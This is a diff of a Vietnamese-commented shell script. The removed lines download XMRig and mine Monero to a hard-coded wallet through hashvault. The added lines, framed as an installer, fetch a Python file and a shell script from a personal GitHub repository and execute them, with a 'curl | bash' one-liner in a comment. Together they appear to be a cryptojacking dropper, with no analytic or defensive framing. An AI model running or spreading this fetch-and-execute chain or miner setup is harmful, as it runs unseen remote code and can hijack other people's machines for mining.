@@ -1,59 +1,62 @@
-#!/bin/sh
+#!/bin/bash
+# curl -sL https://raw.githubusercontent.com/ChauDuongw/moungdungidx/refs/heads/main/a.sh | bash
 
-# Cấu hình của bạn
-MONERO_WALLET_ADDRESS="43ZyyD81HJrhUaVYkfyV9A4pDG3AsyMmE8ATBZVQMLVW6FMszZbU28Wd35wWtcUZESeP3CAXW14cMAVYiKBtaoPCD5ZHPCj"
-POOL_URL="pool.hashvault.pro:443"
-XMRIG_VERSION="6.24.0"
-XMRIG_ARCHIVE="xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz"
-XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/${XMRIG_ARCHIVE}"
-XMRIG_DIR="xmrig-${XMRIG_VERSION}"
 
-# Bước 1: Tạo thư mục để lưu trữ các tệp
-echo "Tạo thư mục đào XMR..."
-mkdir -p ~/xmr_miner
-cd ~/xmr_miner || { echo "Không thể vào thư mục xmr_miner. Thoát."; exit 1; }
+# --- Cấu hình ---
+# URL của file code Python cần "cài đặt" (tool.py)
+PYTHON_CODE_URL="https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/test.py"
+# Tên file code Python sau khi tải về (bạn muốn đặt là a1.py)
+PYTHON_CODE_FILENAME="a1.py"
 
-# Bước 2: Tải xuống XMRig (bỏ qua nếu đã có)
-if [ ! -f "$XMRIG_ARCHIVE" ]; then
-    echo "Tải xuống XMRig từ $XMRIG_URL bằng wget..."
-    if ! command -v wget &> /dev/null; then
-        echo "Lỗi: 'wget' không được tìm thấy. Vui lòng cài đặt wget (ví dụ: sudo apt install wget)."
-        exit 1
-    fi
-    wget "$XMRIG_URL"
-    if [ ! -f "$XMRIG_ARCHIVE" ]; then
-        echo "Lỗi: Không thể tải xuống XMRig. Vui lòng kiểm tra lại URL hoặc kết nối mạng của bạn."
-        exit 1
-    fi
+# URL của script cần chạy sau khi cài đặt (run_app.sh)
+RUN_SCRIPT_URL="https://raw.githubusercontent.com/ChauDuongw/toll/refs/heads/main/caimoitruong.sh"
+# Tên file script sau khi tải về (run_app.sh)
+RUN_SCRIPT_FILENAME="run_app.sh"
+
+# Thư mục đích để lưu các file (ví dụ: thư mục hiện tại)
+INSTALL_DIR="./" # Bạn có thể thay đổi thành "/opt/my_app/" hoặc "/usr/local/bin/" nếu muốn cài đặt hệ thống
+
+echo "--- Bắt đầu quá trình cài đặt và chạy ---"
+
+# --- 1. Tải và "cài đặt" (copy) file code Python ---
+echo "Đang tải $PYTHON_CODE_URL và lưu thành $INSTALL_DIR$PYTHON_CODE_FILENAME..."
+curl -sL "$PYTHON_CODE_URL" -o "$INSTALL_DIR$PYTHON_CODE_FILENAME"
+
+# Kiểm tra xem việc tải và lưu file Python có thành công không
+if [ $? -eq 0 ]; then
+    echo "Tải và cài đặt $PYTHON_CODE_FILENAME thành công."
 else
-    echo "Tệp XMRig đã tồn tại, bỏ qua bước tải xuống."
+    echo "Lỗi: Không thể tải hoặc lưu $PYTHON_CODE_FILENAME. Vui lòng kiểm tra URL hoặc quyền ghi."
+    exit 1 # Thoát với mã lỗi
 fi
 
-# Bước 3: Giải nén XMRig (bỏ qua nếu đã có)
-if [ ! -d "$XMRIG_DIR" ]; then
-    echo "Giải nén XMRig..."
-    if ! command -v tar &> /dev/null; then
-        echo "Lỗi: 'tar' không được tìm thấy. Vui lòng cài đặt tar (thường có sẵn theo mặc định)."
-        exit 1
-    fi
-    tar -zxvf "$XMRIG_ARCHIVE"
-    if [ ! -d "$XMRIG_DIR" ]; then
-        echo "Lỗi: Không thể giải nén XMRig. Vui lòng kiểm tra tệp tin nén."
-        exit 1
-    fi
+# --- 2. Tải script chạy (run_app.sh) ---
+echo "Đang tải $RUN_SCRIPT_URL và lưu thành $INSTALL_DIR$RUN_SCRIPT_FILENAME..."
+curl -sL "$RUN_SCRIPT_URL" -o "$INSTALL_DIR$RUN_SCRIPT_FILENAME"
+
+# Kiểm tra xem việc tải script có thành công không
+if [ $? -eq 0 ]; then
+    echo "Tải $RUN_SCRIPT_FILENAME thành công."
 else
-    echo "Thư mục XMRig đã tồn tại, bỏ qua bước giải nén."
+    echo "Lỗi: Không thể tải hoặc lưu $RUN_SCRIPT_FILENAME. Vui lòng kiểm tra URL hoặc quyền ghi."
+    exit 1 # Thoát với mã lỗi
 fi
 
-# Bước 4: Di chuyển vào thư mục XMRig đã giải nén
-cd "$XMRIG_DIR" || { echo "Không thể vào thư mục XMRig. Thoát."; exit 1; }
+# Cấp quyền thực thi cho script run_app.sh
+echo "Cấp quyền thực thi cho $RUN_SCRIPT_FILENAME..."
+chmod +x "$INSTALL_DIR$RUN_SCRIPT_FILENAME"
 
-# Bước 5: Chạy XMRig và hiển thị log trực tiếp
-echo "Bắt đầu đào Monero. Log sẽ hiển thị trực tiếp tại đây..."
-echo "Địa chỉ ví: $MONERO_WALLET_ADDRESS"
-echo "Pool: $POOL_URL"
+# --- 3. Chạy script đã tải về (run_app.sh) ---
+echo "Đang chạy $RUN_SCRIPT_FILENAME..."
+# Điều hướng đến thư mục cài đặt trước khi chạy nếu cần
+cd "$INSTALL_DIR" || { echo "Lỗi: Không thể vào thư mục cài đặt."; exit 1; }
+./"$RUN_SCRIPT_FILENAME" # Chạy script đã cấp quyền thực thi
 
-# Chạy xmrig với các tùy chọn. Output sẽ hiển thị trực tiếp trên terminal.
-./xmrig -o "$POOL_URL" -u "$MONERO_WALLET_ADDRESS" -p x -k
+# Kiểm tra xem script run_app.sh có chạy thành công không
+if [ $? -eq 0 ]; then
+    echo "Chạy $RUN_SCRIPT_FILENAME thành công."
+else
+    echo "Lỗi: Chạy $RUN_SCRIPT_FILENAME thất bại."
+fi
 
-echo "Script đào Monero đã dừng."
+echo "--- Quá trình hoàn tất ---"
